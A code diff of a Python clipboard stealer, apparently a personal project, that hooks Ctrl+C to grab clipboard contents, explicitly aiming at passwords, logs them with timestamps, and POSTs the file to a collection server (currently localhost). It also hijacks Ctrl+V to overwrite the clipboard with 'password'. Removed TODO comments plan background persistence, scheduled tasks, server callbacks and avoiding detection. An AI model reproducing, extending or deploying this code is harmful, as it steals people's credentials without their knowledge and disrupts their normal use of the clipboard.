@@ -5,44 +5,17 @@ import time
 from pynput import keyboard
 import keyboard
 
-
-# TODO: SEE BELOW
-# TODO: Organize Code into functions
-# TODO: Save Clipboard data to a file, don't overwrite the data maybe?
-# TODO: Set up server side and exfil this file somewhere, HTTP request
-# TODO: Have the program always run in the background - could have it analyze for passwords,
-# listen for ctrl+c and also be a scheduled task
-# TODO: Callback every five minutes from server
-# TODO: if ctrl+c is used, and a password is obtained, then make a chess puzzle appear, answer must be input
-# before allowing to proceed
-# TODO: research windows sys calls, pull functionality from it
-# TODO: make windows pop ups to say what new password is
-
-#TODO: copy the password when control C is used... could alter the password after ctrl V is used or I could not?
-#advantage to leaving it the same is that I would have the password and that would be the password used
-#advantage to having it changed is that I could make the password whatever I want
-#I think I will change the clip_board data to the chess puzzle idea for fun, and still extract the password info
-#although if I change the password it may make the password incorrect and then it will be known there is a tool
-#could do solve the chess puzzle to pause the tool?
-
-#if the password is being set then changing it to what we want could be useful...
-#having the passwords saved is nice
-#changing it to password is kinda fun
-
-#copied = False - how to add boolean to the hotkey calls
 def main():
 
-    #gets the clipboard information and puts it in a file every 10 seconds.
+    #gets the clipboard information and puts it in a file every 90 seconds.
     schedule.every(90).seconds.do(get_clipboard_info)
 
     #Adds a hotkey, can't have parenthesis becasue it returns as a none type instead of a boolean
-    #may be something different then addHotkey
-    #explore the timeout feature instead
+    #explore the timeout feature to add some more functionality
     # TODO: right click copy as well, and paste
     keyboard.add_hotkey('ctrl+c', get_clipboard_info)
 
-    #ctrl V may not be needed, but it ensures that the clipboard data is changed to password.
-    #it can be somewhat inconsistent. also renders ctrl + V unusable
+    #ctrl V ensures that the clipboard data is changed to password
     keyboard.add_hotkey('ctrl+v', change_password)
 
     #from https://schedule.readthedocs.io/en/stable/examples.html, schedule documentation
@@ -51,10 +24,17 @@ def main():
         schedule.run_pending()
         time.sleep(1)
 
-#could use a counter
+#global value that stores the last clipboardValue copied, starts as empty
 last_clip_board_value = ''
+
+"""
+get_clipboard_info is triggered when Ctrl+C happens. The method checks if the clipboard data 
+is different from the last clipboard data that was copied. If it is, then it adds it to the local 
+clipboard data file, adds a timestamp to the password, and sends a post request to the server with 
+the clipboard file atatched. 
+"""
 def get_clipboard_info():
-    #have to define as a global because of how python scope works, similar to updating as normal
+    #have to define as a global because of how python scope works
     global last_clip_board_value
 
     #need a delay here so that the ctrl+c copy updates the clipboard before the information is grabbed
@@ -69,57 +49,53 @@ def get_clipboard_info():
     clipboard_info = pyperclip.paste()
 
     # a appends data to file so the passwords can be stored over time password
-    #plus means for reading and writing, need to be able to read it to pass it through
     clipboard_data_file = open("myfile.txt", "a")
 
+    #checks if the last clipboard value is equal to the current one
     if not last_clip_board_value == clipboard_info:
-        # time.strftime('%a', time.localtime()) - https://docs.python.org/3.12/library/time.html - could be used to format the string by hand
+        #writes the clipboard value to the file along with a timestamp
         clipboard_data_file.write(clipboard_info + ' (' + time.asctime(time.localtime()) + ')')
         clipboard_data_file.write("\n")
-        #exfil here...
 
-        #cloes file!!! FILE mUST BE closed so it resets first
+        #closes the file to avoid issues with already being at the end of the file when trying to exfil the contents
+        #of the file
         clipboard_data_file.close()
 
-        #reopens the file
-        exfil_file = clipboard_data_file = open("myfile.txt", "r")
+        #reopens the file in read only mode
+        exfil_file = open("myfile.txt", "r")
 
-        # for line in exfil_file:
-        #     print(line)
-
-        #TODO: could communicate them one at a time and write them to a file or need to communicate a file
-        #json={"data": clipboard_info}, - to communicate one by one
-
-        #THIS CAN BE USED - IT COMMUNICATES THE DATA TO THE OTHER SERVER
-        # data = clipboard_data_file.read(-1)
-        # print("ll" + data)
-        # requests.post("http://127.0.0.1:12345/output", data=data)
-
-        #communicates using a file and reads file input on the server instead of the client
-        #ISSUE THAT HAS BEEN OCCURING WAS THE FILE NEEDED TO BE CLOSED AFTER BEING WRITTEN IN OTHERWISE THE CONTENT
-        #WAS BLANKS
+        #Posts the file to the server (currently local host), and assigns the file under the key: file
         requests.post("http://127.0.0.1:12345/output", files={'file': exfil_file})
 
+    #if the last and current clipboard value match then close the file
     else:
         clipboard_data_file.close()
 
+    #Updates the last clipboard value
     last_clip_board_value = clipboard_info
 
-    #changes the password to password
+    #changes the clipboard data to password
     change_password()
 
+"""
+add_invisible_character_to_clipboard takes the current clipboard_value and adds an invisible character 
+to the end of it
+"""
 def add_invisible_character_to_clipboard() -> None:
+    # https://unicode-explorer.com/c/115F
+    invisible_character = 'ᅟ'
+
     # paste, pastes text from clipboard
     clipboard_info = pyperclip.paste()
 
-    invisible_character = 'ᅟ'
-
-    # copy - copies whatever test to the clipboard
+    # copy - copies whatever text to the clipboard
     #in this case copies the current clipboard info plus an invisible character
     pyperclip.copy(clipboard_info + invisible_character)
 
+"""
+change_password changes the clipboard data to password
+"""
 def change_password() -> None:
-
     # copy - copies whatever test to the clipboard
     #in this case copies the current clipboard info plus an invisible character
     pyperclip.copy('password')
